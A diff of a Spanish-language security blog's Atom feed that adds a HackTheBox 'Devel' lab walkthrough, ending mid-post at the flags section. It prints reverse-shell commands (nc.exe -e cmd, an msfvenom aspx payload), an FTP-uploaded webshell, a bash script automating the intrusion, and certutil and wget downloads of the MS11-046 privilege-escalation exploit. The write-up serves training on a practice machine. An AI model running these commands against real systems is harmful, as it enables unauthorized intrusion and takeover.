@@ -1,4 +1,296 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-28T01:01:22-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Bashed</title><link href="http://localhost:4000/bashed/" rel="alternate" type="text/html" title="HTB Bashed" /><published>2022-09-28T00:00:00-05:00</published><updated>2022-09-28T00:00:00-05:00</updated><id>http://localhost:4000/bashed</id><content type="html" xml:base="http://localhost:4000/bashed/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-12T15:03:17-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Devel</title><link href="http://localhost:4000/devel/" rel="alternate" type="text/html" title="HTB Devel" /><published>2022-10-12T00:00:00-05:00</published><updated>2022-10-12T00:00:00-05:00</updated><id>http://localhost:4000/devel</id><content type="html" xml:base="http://localhost:4000/devel/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/02-tarjeta.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack devel
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
+
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.10.5
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.5 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Windows&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.5 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+21/tcp open  ftp
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; nmap &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.5 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| 03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: IIS7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento-ftp&quot;&gt;RECONOCIMIENTO FTP&lt;/h2&gt;
+
+&lt;p&gt;Iniciamos con el reconocimiento del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; donde inicialmente probamos el acceso al servicio con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; y sin contraseña, logando el acceso y la capacidad de ejecutar comandos en este servicio.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.5:bast1ant1c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password:
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento-web&quot;&gt;RECONOCIMIENTO WEB&lt;/h2&gt;
+
+&lt;p&gt;Procedemos a revisar la página web por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, obteniendo una página por defecto de un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IIS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/03-page.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Inspeccionando el contenido podemos ver que la imagen se denomina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;welcome.png&lt;/code&gt;, recurso que vimos anteriormente en el reconocimiento ftp.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/04-page2.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;En esta ocasión mostraré dos maneras de realizar la intrusión a la máquina, pero antes de esto, vamos a ingresar a la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;intrusion-webshell&quot;&gt;INTRUSION WEBSHELL&lt;/h2&gt;
+&lt;p&gt;Vamos a localizar una webshell de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aspx&lt;/code&gt; y la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; para poder obtener nuestra primera intrusión.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate .aspx
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/davtest/backdoors/aspx_cmd.aspx console.aspx
+locate nc.exe
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/seclists/Web-Shells/FuzzDB/nc.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos conectamos nuevamente por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt; y cargamos la webshell que denominamos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console.aspx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.5:bast1ant1c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password:
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; put console.aspx 
+&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: console.aspx remote: console.aspx
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+1438 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;18.7861 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos nuestra webshell en la máquina y lo podemos comprobar al ingresar al recurso en el navegador &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.5/console.aspx&lt;/code&gt;&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/05-page3.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Activamos el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket&lt;/code&gt; para compartir los archivos que tenemos en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Creamos un listener por el puerto que elegimos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En la webshell ingresamos el siguiente comando que nos va a permitir ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; directamente en la máquina víctima y así generar una reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.15&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd 10.10.14.15 4564
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente obtenemos acceso a una shell de la máquina victima con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iis apppool\web&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/06-page4.png&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;h2 id=&quot;instusion-msfvenom&quot;&gt;INSTUSION MSFVENOM&lt;/h2&gt;
+
+&lt;p&gt;Para la siguiente intrusión vamos a crear con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; una reverse shell indicando el formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aspx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.15 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4564 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; aspx &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; reverseShell.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cargamos la reverse shell al servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.5:bast1ant1c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password:
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; put reverseShell.aspx 
+&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: reverseShell.aspx remote: reverseShell.aspx
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+2765 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;23.7559 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Creamos un listener por el puerto que elegimos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En el navegador vamos a la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.5/reverseShell.aspx&lt;/code&gt; y logramos tener acceso por otra vía a la máquina víctima.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/07-page5.png&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;h2 id=&quot;script-de-intrusion-pwntrutionsh&quot;&gt;SCRIPT DE INTRUSION PWNTRUTION.SH&lt;/h2&gt;
+
+&lt;p&gt;Comparto el script que realicé para automatizar la intrusión de esta máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;##!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#Author: Bast1ant1c&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# $1 = IP local&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# $2 = Puerto&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# $3 = ReverseShell&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# $4 = IP victima&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Cambiar USER y PASS si es necesario&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'''
+[*] How to use
+[+] ./pwntrution.sh &amp;lt;IP_Local&amp;gt; &amp;lt;Port&amp;gt; &amp;lt;RevShell_Name&amp;gt; &amp;lt;IP_Victim&amp;gt;'''&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else
+
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Generando payload&quot;&lt;/span&gt;
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; aspx &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;.aspx 2&amp;gt;/dev/null
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Carga de payload&quot;&lt;/span&gt;
+ftp &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+quote USER anonymous
+quote PASS 
+put &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;.aspx
+quit
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Ejecución de payload&quot;&lt;/span&gt;
+curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://&lt;span class=&quot;nv&quot;&gt;$4&lt;/span&gt;/&lt;span class=&quot;nv&quot;&gt;$3&lt;/span&gt;.aspx
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Descargando exploit ms11-046&quot;&lt;/span&gt;
+wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe 2&amp;gt;/dev/null
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Obteniendo acceso&quot;&lt;/span&gt;
+rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/08-page6.png&quot; /&gt;  
+&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
+
+&lt;p&gt;Realizamos como primer paso una enumeración basica, por medio del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;, obteniendo información interesante en cuanto a la versión del sistema operativo actual.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systeminfo
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de un poco de investigación de la versión de Windows &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6.1.7600&lt;/code&gt;, encontramos que es vulnerable al script &lt;a href=&quot;https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe&quot;&gt;MS11-046.exe&lt;/a&gt; del github de &lt;a href=&quot;https://github.com/abatchy17&quot;&gt;abatchy17&lt;/a&gt;, por ende, procedemos a descargar este recurso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/abatchy17/WindowsExploits/raw/master/MS11-046/MS11-046.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al obtener el exploit, activamos un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En la máquina víctima realizamos la descarga desde la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Temp&lt;/code&gt; del exploit por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
+certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.15/MS11-046.exe
+MS11-046.exe
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Listo! Logramos una shell con un usuario administrador.&lt;/p&gt;
+
+&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
+
+&lt;p&gt;Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type&lt;/code&gt;, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.&lt;/p&gt;
+
